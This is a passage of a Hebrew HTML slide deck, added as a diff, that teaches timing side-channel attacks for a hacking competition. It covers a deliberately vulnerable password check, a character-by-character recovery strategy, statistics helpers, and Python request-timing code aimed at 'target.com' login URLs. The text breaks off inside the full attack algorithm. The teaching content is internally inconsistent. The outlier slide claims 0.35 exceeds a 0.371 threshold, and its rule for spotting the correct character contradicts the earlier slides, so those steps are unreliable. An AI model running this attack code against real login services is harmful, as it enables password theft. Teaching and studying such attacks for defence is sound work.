@@ -1,0 +1,1201 @@
+<!DOCTYPE html>
+<html lang="he" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>התקפות ערוץ צדדי - Timing Attacks | Hackit Competition</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
+            color: #333;
+            overflow-x: hidden;
+            overflow-y: auto;
+            min-height: 100vh;
+        }
+
+        .presentation {
+            width: 100%;
+            min-height: 100vh;
+            position: relative;
+        }
+
+        .slide {
+            position: absolute;
+            width: 100%;
+            min-height: 100vh;
+            display: none;
+            flex-direction: column;
+            justify-content: flex-start;
+            align-items: center;
+            padding: 100px 60px 150px 60px;
+            opacity: 0;
+            transition: opacity 0.5s ease-in-out;
+            overflow-y: auto;
+        }
+
+        .slide.active {
+            display: flex;
+            opacity: 1;
+            position: relative;
+        }
+
+        .slide-content {
+            background: white;
+            border-radius: 20px;
+            padding: 50px;
+            max-width: 1200px;
+            width: 100%;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            animation: slideIn 0.6s ease-out;
+            margin: auto;
+        }
+
+        @keyframes slideIn {
+            from {
+                transform: translateY(50px);
+                opacity: 0;
+            }
+            to {
+                transform: translateY(0);
+                opacity: 1;
+            }
+        }
+
+        h1 {
+            color: #1e3c72;
+            font-size: 3em;
+            margin-bottom: 30px;
+            text-align: center;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.1);
+        }
+
+        h2 {
+            color: #2a5298;
+            font-size: 2.2em;
+            margin-bottom: 25px;
+            border-bottom: 3px solid #4a90e2;
+            padding-bottom: 15px;
+        }
+
+        h3 {
+            color: #1e3c72;
+            font-size: 1.5em;
+            margin: 25px 0 15px 0;
+        }
+
+        p, li {
+            font-size: 1.2em;
+            line-height: 1.8;
+            margin-bottom: 15px;
+            color: #444;
+        }
+
+        .highlight {
+            background: linear-gradient(120deg, #ffd700 0%, #ffed4e 100%);
+            padding: 3px 8px;
+            border-radius: 5px;
+            font-weight: bold;
+        }
+
+        .code-block {
+            background: #1e1e1e;
+            color: #d4d4d4;
+            padding: 25px;
+            border-radius: 10px;
+            font-family: 'Courier New', monospace;
+            font-size: 1.1em;
+            direction: ltr;
+            text-align: left;
+            margin: 20px 0;
+            overflow-x: auto;
+            box-shadow: inset 0 2px 10px rgba(0,0,0,0.5);
+        }
+
+        .code-block .keyword { color: #569cd6; }
+        .code-block .string { color: #ce9178; }
+        .code-block .comment { color: #6a9955; }
+        .code-block .function { color: #dcdcaa; }
+        .code-block .number { color: #b5cea8; }
+
+        .icon-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 30px;
+            margin: 30px 0;
+        }
+
+        .icon-item {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            padding: 25px;
+            border-radius: 15px;
+            text-align: center;
+            color: white;
+            transition: transform 0.3s ease;
+            cursor: pointer;
+        }
+
+        .icon-item:hover {
+            transform: translateY(-10px) scale(1.05);
+        }
+
+        .icon {
+            font-size: 3em;
+            margin-bottom: 15px;
+        }
+
+        .navigation {
+            position: fixed;
+            bottom: 30px;
+            left: 50%;
+            transform: translateX(-50%);
+            display: flex;
+            gap: 15px;
+            z-index: 1000;
+            background: rgba(30, 60, 114, 0.95);
+            padding: 10px 20px;
+            border-radius: 50px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.4);
+        }
+
+        .nav-btn {
+            background: rgba(255, 255, 255, 0.9);
+            border: none;
+            padding: 15px 30px;
+            border-radius: 50px;
+            font-size: 1.1em;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            font-weight: bold;
+            color: #1e3c72;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
+        }
+
+        .nav-btn:hover {
+            background: white;
+            transform: translateY(-3px);
+            box-shadow: 0 8px 20px rgba(0,0,0,0.3);
+        }
+
+        .slide-counter {
+            position: fixed;
+            top: 30px;
+            left: 30px;
+            background: rgba(255, 255, 255, 0.9);
+            padding: 10px 20px;
+            border-radius: 25px;
+            font-weight: bold;
+            color: #1e3c72;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
+        }
+
+        .interactive-demo {
+            background: #f8f9fa;
+            padding: 30px;
+            border-radius: 15px;
+            margin: 25px 0;
+            border: 2px solid #4a90e2;
+        }
+
+        .demo-input {
+            width: 100%;
+            padding: 15px;
+            font-size: 1.1em;
+            border: 2px solid #4a90e2;
+            border-radius: 10px;
+            margin: 10px 0;
+            direction: ltr;
+        }
+
+        .demo-btn {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            padding: 15px 40px;
+            font-size: 1.1em;
+            border-radius: 10px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            margin: 10px 5px;
+        }
+
+        .demo-btn:hover {
+            transform: scale(1.05);
+            box-shadow: 0 5px 20px rgba(102, 126, 234, 0.5);
+        }
+
+        .demo-output {
+            background: white;
+            padding: 20px;
+            border-radius: 10px;
+            margin-top: 15px;
+            min-height: 60px;
+            border: 2px solid #e0e0e0;
+            font-family: monospace;
+            direction: ltr;
+            text-align: left;
+        }
+
+        .stats-box {
+            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
+            color: white;
+            padding: 20px;
+            border-radius: 15px;
+            margin: 15px 0;
+            text-align: center;
+            font-size: 1.3em;
+            font-weight: bold;
+        }
+
+        .formula {
+            background: #f8f9fa;
+            padding: 20px;
+            border-radius: 10px;
+            margin: 20px 0;
+            border-right: 5px solid #4a90e2;
+            font-size: 1.3em;
+            text-align: center;
+            direction: ltr;
+        }
+
+        .warning-box {
+            background: #fff3cd;
+            border: 2px solid #ffc107;
+            border-radius: 10px;
+            padding: 20px;
+            margin: 20px 0;
+        }
+
+        .warning-box::before {
+            content: "⚠️ ";
+            font-size: 1.5em;
+        }
+
+        .success-box {
+            background: #d4edda;
+            border: 2px solid #28a745;
+            border-radius: 10px;
+            padding: 20px;
+            margin: 20px 0;
+        }
+
+        .success-box::before {
+            content: "✅ ";
+            font-size: 1.5em;
+        }
+
+        ul {
+            margin-right: 30px;
+        }
+
+        .two-columns {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 30px;
+            margin: 20px 0;
+        }
+
+        .attack-flow {
+            background: white;
+            padding: 20px;
+            border-radius: 10px;
+            border: 2px solid #4a90e2;
+            margin: 10px 0;
+            position: relative;
+        }
+
+<!--        .attack-flow::after {-->
+<!--            content: "⬇️";-->
+<!--            display: block;-->
+<!--            text-align: center;-->
+<!--            font-size: 2em;-->
+<!--&lt;!&ndash;            margin: 10px 0;&ndash;&gt;-->
+<!--        }-->
+
+        .attack-flow:last-child::after {
+            content: "";
+        }
+
+        .game-section {
+            background: linear-gradient(135deg, #fa709a 0%, #fee140 100%);
+            padding: 30px;
+            border-radius: 20px;
+            margin: 20px 0;
+            color: white;
+            text-align: center;
+        }
+
+        .role-card {
+            background: white;
+            color: #333;
+            padding: 25px;
+            border-radius: 15px;
+            margin: 15px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+        }
+
+        .progress-bar {
+            width: 100%;
+            height: 5px;
+            background: rgba(255,255,255,0.3);
+            position: fixed;
+            top: 0;
+            left: 0;
+            z-index: 1001;
+        }
+
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #667eea 0%, #764ba2 100%);
+            transition: width 0.3s ease;
+        }
+
+        @media (max-width: 768px) {
+            .slide {
+                padding: 100px 30px 150px 30px;
+            }
+            .slide-content {
+                padding: 30px;
+            }
+            h1 { font-size: 2em; }
+            h2 { font-size: 1.5em; }
+            .icon-grid {
+                grid-template-columns: 1fr;
+            }
+            .two-columns {
+                grid-template-columns: 1fr;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="progress-bar">
+        <div class="progress-fill" id="progressFill"></div>
+    </div>
+    
+    <div class="slide-counter" id="slideCounter">1 / 15</div>
+
+    <div class="presentation">
+        <!-- Slide 1: Title -->
+        <div class="slide active">
+            <div class="slide-content">
+                <h1>🔒 התקפות ערוץ צדדי</h1>
+                <h1 style="color: #4a90e2; font-size: 2.5em;">Side Channel Attacks</h1>
+                <div class="icon-grid">
+                    <div class="icon-item">
+                        <div class="icon">⏱️</div>
+                        <h3>Timing Attacks</h3>
+                        <p>התקפות תזמון</p>
+                    </div>
+                    <div class="icon-item">
+                        <div class="icon">⚡</div>
+                        <h3>Power Analysis</h3>
+                        <p>ניתוח צריכת חשמל</p>
+                    </div>
+                    <div class="icon-item">
+                        <div class="icon">🔌</div>
+                        <h3>Cache Attacks</h3>
+                        <p>התקפות מטמון</p>
+                    </div>
+                    <div class="icon-item">
+                        <div class="icon">🛡️</div>
+                        <h3>Countermeasures</h3>
+                        <p>אמצעי הגנה</p>
+                    </div>
+                </div>
+                <p style="text-align: center; font-size: 1.3em; margin-top: 30px;">
+                    הכנה לתחרות <span class="highlight">Hackit</span> - הבנת האיומים והדרכים להתגונן
+                </p>
+            </div>
+        </div>
+
+        <!-- Slide 2: What is Side Channel Attack -->
+        <div class="slide">
+            <div class="slide-content">
+                <h2>❓ מה זו התקפת ערוץ צדדי?</h2>
+                <p style="font-size: 1.4em; text-align: center; margin: 30px 0;">
+                    <span class="highlight">שיטת תקיפה המנצלת מידע שולי ממערכת דרך ערוצים צדדיים</span>
+                </p>
+                
+                <div class="two-columns">
+                    <div>
+                        <h3>✅ מה זה אומר?</h3>
+                        <ul>
+                            <li>המידע נאסף ממדידות התנהגות פיזית של המערכת</li>
+                            <li>לא תוקפים ישירות את האלגוריתם הקריפטוגרפי</li>
+                            <li>מנצלים חולשות ביישום ולא בתיאוריה</li>
+                            <li>מגלים תבניות קשורות למידע סודי</li>
+                        </ul>
+                    </div>
+                    <div>
+                        <h3>🎯 דוגמאות לערוצים צדדיים:</h3>
+                        <ul>
+                            <li><strong>⏱️ זמן ביצוע</strong> - Timing</li>
+                            <li><strong>⚡ צריכת חשמל</strong> - Power</li>
+                            <li><strong>🌡️ דליפת מידע</strong> - Information Leakage</li>
+                            <li><strong>📡 קרינה אלקטרומגנטית</strong> - EM</li>
+                        </ul>
+                    </div>
+                </div>
+
+                  <h3 style="margin-top: 40px; text-align: center; color: #1e3c72;">הדגמת פרצות ערוץ צדדי</h3>
+                <div style="text-align: center; margin: 30px 0;">
+    <img src="https://drive.google.com/thumbnail?id=1tZVOkR1-Bvg6kV0MztA_PnMSBQuYEbnp&sz=w3000"
+         alt="הדגמת פרצות ערוץ צדדי"
+         style="width: 80%; max-width: 1800px; height: auto; border-radius: 15px; box-shadow: 0 10px 30px rgba(0,0,0,0.3); border: 3px solid #4a90e2;">
+</div>
+
+                <div class="warning-box">
+                    <strong>חשוב להבין:</strong> גם מערכת עם הצפנה מושלמת יכולה להיות פגיעה להתקפות ערוץ צדדי!
+                </div>
+            </div>
+        </div>
+
+        <!-- Slide 3: Timing Attack Introduction -->
+        <div class="slide">
+            <div class="slide-content">
+                <h2>⏱️ התקפת תזמון (Timing Attack)</h2>
+                <p style="font-size: 1.3em;">התקפה המבוססת על <span class="highlight">מדידת זמני תגובה</span> של המערכת</p>
+
+                <h3>💡 העיקרון הבסיסי:</h3>
+                <div class="attack-flow">
+                    <strong>1. שליחת שאילתות למערכת</strong>
+                    <p>התוקף שולח סיסמאות שונות לבדיקה ⬇️</p>
+                </div>
+                <div class="attack-flow">
+                    <strong>2. מדידת זמן התגובה</strong>
+                    <p> מודדים כמה זמן לוקח למערכת להחזיר תשובה ⬇️</p>
+                </div>
+                <div class="attack-flow">
+                    <strong>3. ניתוח סטטיסטי</strong>
+                    <p>מזהים דפוסים בזמני התגובה ⬇️</p>
+                </div>
+                <div class="attack-flow">
+                    <strong>4. חשיפת המידע הסודי</strong>
+                    <p>משתמשים בדפוסים כדי לגלות את הסיסמה</p>
+                </div>
+
+                <div class="stats-box">
+                    🎯 המפתח: הבדלים קטנים בזמן יכולים לחשוף מידע גדול!
+                </div>
+            </div>
+        </div>
+
+        <!-- Slide 4: Vulnerable Code Example -->
+        <div class="slide">
+            <div class="slide-content">
+                <h2>🐛 קוד פגיע - דוגמה</h2>
+                <p>הנה קוד בדיקת סיסמה שפגיע להתקפת תזמון:</p>
+
+<pre class="code-block"><span class="keyword">SECRET_PASSWORD</span> = <span class="string">'1234'</span>
+
+<span class="keyword">def</span> <span class="function">verifyPassword</span>(inPass):
+    result = <span class="keyword">True</span>
+    
+    <span class="comment"># pad secret password and input password to same length</span>
+    paddingInPassword = (longPadding + inPass)[-len(longPadding):]
+    paddedSecretPassword = (longPadding + SECRET_PASSWORD)[-len(longPadding):]
+    
+    i = <span class="number">0</span>
+    <span class="keyword">for</span> ch <span class="keyword">in</span> paddedSecretPassword:
+        <span class="keyword">if</span> paddingInPassword[i] != ch:
+            <span class="highlight" style="color: #f44336;">sleep(Delay)  # 🚨 הבעיה כאן!</span>
+            result = <span class="keyword">False</span>
+        i = i + <span class="number">1</span>
+    
+    <span class="keyword">return</span> result</pre>
+
+                <div class="warning-box">
+                    <strong>⚠️ הפגיעות:</strong> הפונקציה <code>sleep(Delay)</code> נקראת רק כאשר התו שגוי!
+                    <br>כל תו נכון חוסך זמן המתנה אחד, וזה מאפשר לתוקף לזהות תווים נכונים.
+                </div>
+
+                <p style="margin-top: 20px;"><strong>🤔 למה זה בעיה?</strong></p>
+                <ul>
+                    <li>סיסמה נכונה במקום הראשון = פחות השהיות</li>
+                    <li>סיסמה שגויה במקום הראשון = יותר השהיות</li>
+                    <li>התוקף יכול לזהות תווים נכונים לפי זמן התגובה!</li>
+                </ul>
+            </div>
+        </div>
+
+        <!-- Slide 5: Attack Strategy -->
+        <div class="slide">
+            <div class="slide-content">
+                <h2>🎯 אסטרטגיית הפריצה</h2>
+                <p style="font-size: 1.3em;">תהליך הפריצה מתבצע בשני שלבים עיקריים:</p>
+
+                <div class="two-columns">
+                    <div class="role-card">
+                        <h3>📏 שלב 1: מציאת אורך הסיסמה</h3>
+                        <ul style="text-align: right;">
+                            <li>שולחים סיסמאות באורכים שונים</li>
+                            <li>מודדים את זמן התגובה הממוצע</li>
+                            <li>מזהים קפיצה משמעותית בזמן</li>
+                            <li>הקפיצה מצביעה על האורך הנכון</li>
+                        </ul>
+                        <div class="stats-box" style="background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); margin-top: 20px;">
+                            סיבוכיות: O(n)<br>
+                            n = אורך מקסימלי
+                        </div>
+                    </div>
+                    <div class="role-card">
+                        <h3>🔤 שלב 2: מציאת התווים</h3>
+                        <ul style="text-align: right;">
+                            <li>מנסים כל תו אפשרי במיקום הראשון</li>
+                            <li>התו הנכון ייתן זמן תגובה שונה</li>
+                            <li>עוברים למיקום הבא</li>
+                            <li>חוזרים עד גילוי הסיסמה המלאה</li>
+                        </ul>
+                        <div class="stats-box" style="background: linear-gradient(135deg, #fa709a 0%, #fee140 100%); margin-top: 20px;">
+                            סיבוכיות: O(n × m)<br>
+                            n = אורך, m = גודל אלפבית
+                        </div>
+                    </div>
+                </div>
+
+                <div class="success-box" style="margin-top: 30px;">
+                    <strong>🎊 יתרון אדיר:</strong> במקום לנסות 62^n אפשרויות (brute force), מספיק n × 62 ניסיונות!
+                    <br>לדוגמה: סיסמה באורך 8 → 218 טריליון לעומת 496 ניסיונות בלבד!
+                </div>
+            </div>
+        </div>
+
+        <!-- Slide 6: Finding Password Length -->
+        <div class="slide">
+            <div class="slide-content">
+                <h2>📏 מציאת אורך הסיסמה - הדגמה</h2>
+                
+                <p style="font-size: 1.2em;">נניח שהסיסמה הסודית היא <code>"1234"</code></p>
+
+                <table style="width: 100%; border-collapse: collapse; margin: 30px 0; font-size: 1.1em;">
+                    <thead>
+                        <tr style="background: #4a90e2; color: white;">
+                            <th style="padding: 15px; border: 1px solid #ddd;">סיסמת ניסיון</th>
+                            <th style="padding: 15px; border: 1px solid #ddd;">אורך</th>
+                            <th style="padding: 15px; border: 1px solid #ddd;">מספר השהיות</th>
+                            <th style="padding: 15px; border: 1px solid #ddd;">זמן (יחסי)</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr>
+                            <td style="padding: 15px; border: 1px solid #ddd; direction: ltr;">*</td>
+                            <td style="padding: 15px; border: 1px solid #ddd;">1</td>
+                            <td style="padding: 15px; border: 1px solid #ddd;">4</td>
+                            <td style="padding: 15px; border: 1px solid #ddd; background: #ffcccc;">⏱️⏱️⏱️⏱️</td>
+                        </tr>
+                        <tr>
+                            <td style="padding: 15px; border: 1px solid #ddd; direction: ltr;">**</td>
+                            <td style="padding: 15px; border: 1px solid #ddd;">2</td>
+                            <td style="padding: 15px; border: 1px solid #ddd;">4</td>
+                            <td style="padding: 15px; border: 1px solid #ddd; background: #ffcccc;">⏱️⏱️⏱️⏱️</td>
+                        </tr>
+                        <tr>
+                            <td style="padding: 15px; border: 1px solid #ddd; direction: ltr;">***</td>
+                            <td style="padding: 15px; border: 1px solid #ddd;">3</td>
+                            <td style="padding: 15px; border: 1px solid #ddd;">4</td>
+                            <td style="padding: 15px; border: 1px solid #ddd; background: #ffcccc;">⏱️⏱️⏱️⏱️</td>
+                        </tr>
+                        <tr>
+                            <td style="padding: 15px; border: 1px solid #ddd; direction: ltr;">****</td>
+                            <td style="padding: 15px; border: 1px solid #ddd;">4</td>
+                            <td style="padding: 15px; border: 1px solid #ddd;">4</td>
+                            <td style="padding: 15px; border: 1px solid #ddd; background: #ffcccc;">⏱️⏱️⏱️⏱️</td>
+                        </tr>
+                        <tr style="background: #ffffcc;">
+                            <td style="padding: 15px; border: 1px solid #ddd; direction: ltr;">*****</td>
+                            <td style="padding: 15px; border: 1px solid #ddd;"><strong>5</strong></td>
+                            <td style="padding: 15px; border: 1px solid #ddd;"><strong>5</strong></td>
+                            <td style="padding: 15px; border: 1px solid #ddd; background: #ff9999;">⏱️⏱️⏱️⏱️⏱️</td>
+                        </tr>
+                    </tbody>
+                </table>
+
+                <div class="success-box">
+                    <strong>💡 תובנה:</strong> ברגע שמספר ההשהיות עולה, גילינו את אורך הסיסמה!
+                    <br>באורך 5, התווים מתחילים להשוות לסיסמה האמיתית, ולכן יש 5 השהיות במקום 4.
+                    <br><strong>מסקנה: אורך הסיסמה = מספר ההשהיות - 1 = 4</strong>
+                </div>
+            </div>
+        </div>
+
+        <!-- Slide 7: Finding Characters -->
+        <div class="slide">
+            <div class="slide-content">
+                <h2>🔤 מציאת התווים - הדגמה</h2>
+                
+                <p style="font-size: 1.2em;">לאחר שמצאנו שהאורך הוא 4, מתחילים לגלות כל תו:</p>
+
+                <h3>שלב 1: מציאת התו הראשון</h3>
+                <table style="width: 100%; border-collapse: collapse; margin: 20px 0;">
+                    <thead>
+                        <tr style="background: #4a90e2; color: white;">
+                            <th style="padding: 15px; border: 1px solid #ddd;">ניסיון</th>
+                            <th style="padding: 15px; border: 1px solid #ddd;">מספר השהיות</th>
+                            <th style="padding: 15px; border: 1px solid #ddd;">מסקנה</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr>
+                            <td style="padding: 15px; border: 1px solid #ddd; direction: ltr;">0***</td>
+                            <td style="padding: 15px; border: 1px solid #ddd;">4</td>
+                            <td style="padding: 15px; border: 1px solid #ddd;">❌ שגוי</td>
+                        </tr>
+                        <tr style="background: #ccffcc;">
+                            <td style="padding: 15px; border: 1px solid #ddd; direction: ltr;">1***</td>
+                            <td style="padding: 15px; border: 1px solid #ddd;"><strong>3</strong></td>
+                            <td style="padding: 15px; border: 1px solid #ddd;">✅ נכון! (פחות השהיות)</td>
+                        </tr>
+                    </tbody>
+                </table>
+
+                <h3>שלב 2: מציאת התו השני</h3>
+                <table style="width: 100%; border-collapse: collapse; margin: 20px 0;">
+                    <thead>
+                        <tr style="background: #4a90e2; color: white;">
+                            <th style="padding: 15px; border: 1px solid #ddd;">ניסיון</th>
+                            <th style="padding: 15px; border: 1px solid #ddd;">מספר השהיות</th>
+                            <th style="padding: 15px; border: 1px solid #ddd;">מסקנה</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr>
+                            <td style="padding: 15px; border: 1px solid #ddd; direction: ltr;">10**</td>
+                            <td style="padding: 15px; border: 1px solid #ddd;">3</td>
+                            <td style="padding: 15px; border: 1px solid #ddd;">❌ שגוי</td>
+                        </tr>
+                        <tr>
+                            <td style="padding: 15px; border: 1px solid #ddd; direction: ltr;">11**</td>
+                            <td style="padding: 15px; border: 1px solid #ddd;">3</td>
+                            <td style="padding: 15px; border: 1px solid #ddd;">❌ שגוי</td>
+                        </tr>
+                        <tr style="background: #ccffcc;">
+                            <td style="padding: 15px; border: 1px solid #ddd; direction: ltr;">12**</td>
+                            <td style="padding: 15px; border: 1px solid #ddd;"><strong>2</strong></td>
+                            <td style="padding: 15px; border: 1px solid #ddd;">✅ נכון!</td>
+                        </tr>
+                    </tbody>
+                </table>
+
+                <div class="success-box">
+                    <strong>🎯 התהליך חוזר:</strong> ממשיכים באותו אופן עד שמגלים את כל התווים: 1234
+                </div>
+            </div>
+        </div>
+
+        <!-- Slide 8: Statistics - Mean -->
+        <div class="slide">
+            <div class="slide-content">
+                <h2>📊 סטטיסטיקה: ממוצע (Mean)</h2>
+                
+                <p style="font-size: 1.3em;">הממוצע הוא <span class="highlight">הערך המרכזי</span> של קבוצת מספרים</p>
+
+                <div class="formula">
+                    <strong>נוסחת הממוצע:</strong><br><br>
+                    x̄ = (x₁ + x₂ + ... + xₙ) / n
+                </div>
+
+                <div class="two-columns">
+                    <div>
+                        <h3>💡 דוגמה פשוטה:</h3>
+                        <p>מדידות זמן (באלפיות שנייה):</p>
+                        <pre class="code-block">
+measurements = [0.12, 0.15, 0.13, 0.14, 0.11]
+
+sum = 0.65
+count = 5
+mean = 0.65 / 5 = <strong>0.13</strong></pre>
+                    </div>
+                    <div>
+                        <h3>🎯 שימוש בהתקפה:</h3>
+                        <ul>
+                            <li>מודדים זמן תגובה 10 פעמים</li>
+                            <li>מחשבים ממוצע לכל תו</li>
+                            <li>התו עם הממוצע השונה = נכון!</li>
+                            <li>מפחית השפעת רעשים</li>
+                        </ul>
+                    </div>
+                </div>
+
+                <div class="interactive-demo">
+                    <h3>🧮 חישוב ממוצע - אינטראקטיבי</h3>
+                    <input type="text" class="demo-input" id="meanInput" placeholder="הכנס מספרים מופרדים בפסיקים: 0.12, 0.15, 0.13" dir="ltr">
+                    <button class="demo-btn" onclick="calculateMean()">חשב ממוצע</button>
+                    <div class="demo-output" id="meanOutput"></div>
+                </div>
+
+                <pre class="code-block">
+<span class="keyword">def</span> <span class="function">mean</span>(values):
+    sum = <span class="number">0.0</span>
+    <span class="keyword">for</span> a <span class="keyword">in</span> values:
+        sum += a
+    <span class="keyword">return</span> sum / len(values)</pre>
+            </div>
+        </div>
+
+        <!-- Slide 9: Statistics - Standard Deviation -->
+        <div class="slide">
+            <div class="slide-content">
+                <h2>📊 סטטיסטיקה: סטיית תקן (Standard Deviation)</h2>
+                
+                <p style="font-size: 1.3em;">סטיית התקן מודדת את <span class="highlight">הפיזור של הנתונים</span> סביב הממוצע</p>
+
+                <div class="formula">
+                    <strong>נוסחת סטיית התקן:</strong><br><br>
+                    σ = √[Σ(xᵢ - x̄)² / n]
+                </div>
+
+                <div class="two-columns">
+                    <div>
+                        <h3>🤔 מה זה אומר?</h3>
+                        <ul>
+                            <li><strong>סטייה קטנה</strong> = נתונים קרובים לממוצע</li>
+                            <li><strong>סטייה גדולה</strong> = נתונים מפוזרים</li>
+                            <li>עוזר לזהות ערכים חריגים</li>
+                            <li>מודד את עקביות המדידות</li>
+                        </ul>
+                    </div>
+                    <div>
+                        <h3>🎯 שימוש בהתקפה:</h3>
+                        <ul>
+                            <li>קובעים סף לזיהוי חריגים</li>
+                            <li>תו שזמנו מעבר לממוצע + (סטייה × 2)</li>
+                            <li>זה התו הנכון!</li>
+                            <li>מבטל false positives</li>
+                        </ul>
+                    </div>
+                </div>
+
+                <div class="interactive-demo">
+                    <h3>🧮 חישוב סטיית תקן - אינטראקטיבי</h3>
+                    <input type="text" class="demo-input" id="stdInput" placeholder="הכנס מספרים מופרדים בפסיקים" dir="ltr">
+                    <button class="demo-btn" onclick="calculateStd()">חשב סטיית תקן</button>
+                    <div class="demo-output" id="stdOutput"></div>
+                </div>
+
+                <pre class="code-block">
+<span class="keyword">def</span> <span class="function">standard_deviation</span>(values):
+    tempSum = <span class="number">0</span>
+    mean1 = mean(values)
+    <span class="keyword">for</span> a <span class="keyword">in</span> values:
+        tempSum += (a - mean1) ** <span class="number">2</span>
+    <span class="keyword">return</span> math.sqrt(tempSum / len(values))</pre>
+            </div>
+        </div>
+
+        <!-- Slide 10: Outlier Detection -->
+        <div class="slide">
+            <div class="slide-content">
+                <h2>🔍 זיהוי חריגים (Outliers)</h2>
+                
+                <p style="font-size: 1.3em;">איך מזהים את התו הנכון מתוך כל המדידות?</p>
+
+                <h3>📐 הכלל: סף חריגה (Threshold)</h3>
+                <div class="formula">
+                    <strong>תו נכון אם:</strong><br><br>
+                    time > mean + (std × threshold)
+                </div>
+
+                <div class="stats-box">
+                    threshold = 2 (ערך נפוץ)
+                    <br>אומר: התו נכון אם זמנו 2 סטיות תקן מעל הממוצע
+                </div>
+
+                <h3>💡 דוגמה מספרית:</h3>
+                <div style="background: #f8f9fa; padding: 25px; border-radius: 15px; margin: 20px 0;">
+                    <p><strong>מדידות זמן עבור תווים שונים:</strong></p>
+                    <ul style="direction: ltr; text-align: left; font-family: monospace; font-size: 1.1em;">
+                        <li>'a' → 0.12 שניות</li>
+                        <li>'b' → 0.13 שניות</li>
+                        <li>'1' → 0.11 שניות ⬅️ נכון!</li>
+                        <li>'c' → 0.35 שניות (חריג! זמן ארוך יותר)</li>
+                    </ul>
+                    <p style="margin-top: 20px;"><strong>חישוב:</strong></p>
+                    <ul style="direction: ltr; text-align: left; font-family: monospace;">
+                        <li>ממוצע = 0.1775</li>
+                        <li>סטיית תקן = 0.097</li>
+                        <li>סף = 0.1775 + (0.097 × 2) = 0.371</li>
+                        <li>התו 'c' עבר את הסף → <span style="color: #28a745; font-weight: bold;">התו 'c' לא נכון!</span></li>
+                        <li>התו '1' הכי קרוב למינימום → <span style="color: #28a745; font-weight: bold;">התו '1' נכון!</span></li>
+                    </ul>
+                </div>
+
+                <pre class="code-block">
+<span class="keyword">def</span> <span class="function">outliers</span>(samples, threshold):
+    mean1 = mean(samples.values())
+    std = standard_deviation(samples.values())
+    ol = {}
+    <span class="keyword">for</span> item <span class="keyword">in</span> samples:
+        <span class="keyword">if</span> (samples[item] > (mean1 + std * threshold)):
+            ol[item] = samples[item]  <span class="comment"># ערך חריג!</span>
+    <span class="keyword">return</span> ol</pre>
+            </div>
+        </div>
+
+        <!-- Slide 11: Measuring Response Time -->
+        <div class="slide">
+            <div class="slide-content">
+                <h2>⏱️ מדידת זמן תגובה - קוד מעשי</h2>
+
+                <p style="font-size: 1.2em;">כך מודדים זמן תגובה של בדיקת סיסמה:</p>
+
+                <pre class="code-block">
+<span class="keyword">import</span> requests
+<span class="keyword">import</span> time
+
+<span class="comment"># מדידה בודדת</span>
+url = <span class="string">"https://target.com/login/1234"</span>
+
+start = time.time()
+r = requests.get(url)
+end = time.time()
+
+duration = end - start  <span class="comment"># הזמן שלקח לתגובה</span>
+<span class="function">print</span>(<span class="string">f"Time: {duration:.4f} seconds"</span>)</pre>
+
+                <h3>🔄 מדידה מרובה למהימנות</h3>
+                <p>ביצוע מספר מדידות ולקיחת ממוצע מפחית רעשים:</p>
+
+                <pre class="code-block">
+<span class="keyword">def</span> <span class="function">timeit</span>(url2check, repeat=<span class="number">10</span>):
+    <span class="string">"""מודד זמן ממוצע של מספר בקשות"""</span>
+    times = []
+    
+    <span class="keyword">for</span> _ <span class="keyword">in</span> range(repeat):
+        start = time.time()
+        r = requests.get(url2check)
+        end = time.time()
+        times.append(end - start)
+    
+    <span class="keyword">return</span> mean(times)  <span class="comment"># החזר ממוצע</span>
+
+<span class="comment"># שימוש:</span>
+avg_time = timeit(<span class="string">"https://target.com/login/1234"</span>, repeat=<span class="number">10</span>)
+<span class="function">print</span>(<span class="string">f"Average time: {avg_time:.4f} seconds"</span>)</pre>
+
+                <div class="warning-box">
+                    <strong>⚠️ טיפ חשוב:</strong> 10 מדידות זה מספר טוב למאזן בין מהירות לדיוק.
+                    יותר מדידות = יותר דיוק אבל יותר זמן.
+                </div>
+            </div>
+        </div>
+
+        <!-- Slide 12: Complete Attack Algorithm -->
+        <div class="slide">
+            <div class="slide-content">
+                <h2>🎯 אלגוריתם התקיפה המלא</h2>
+
+                <div class="attack-flow">
+                    <h3>שלב 1️⃣: מציאת אורך הסיסמה</h3>
+                    <pre class="code-block" style="margin: 15px 0;">
+len_pass = <span class="number">1</span>
+measurements = []
+
+<span class="keyword">while</span> len_pass < MAX_LEN:
+    <span class="comment"># מדוד 10 פעמים עבור אורך זה</span>
+    avg_time = timeit(build_url(<span class="string">'*'</span> * len_pass), <span class="number">10</span>)
+    measurements.append(avg_time)
+    
+    <span class="keyword">if</span> len(measurements) >= <span class="number">2</span>:
+        <span class="comment"># בדוק אם יש קפיצה משמעותית</span>
+        diff = measurements[-<span class="number">1</span>] - measurements[-<span class="number">2</span>]
+        <span class="keyword">if</span> diff > (std * threshold):
+            <span class="keyword">break</span>  <span class="comment"># מצאנו את האורך!</span>
+    
+    len_pass += <span class="number">1</span></pre>
+                </div>
+
+                <div class="attack-flow">
+                    <h3>שלב 2️⃣: מציאת כל תו</h3>
+                    <pre class="code-block" style="margin: 15px 0;">
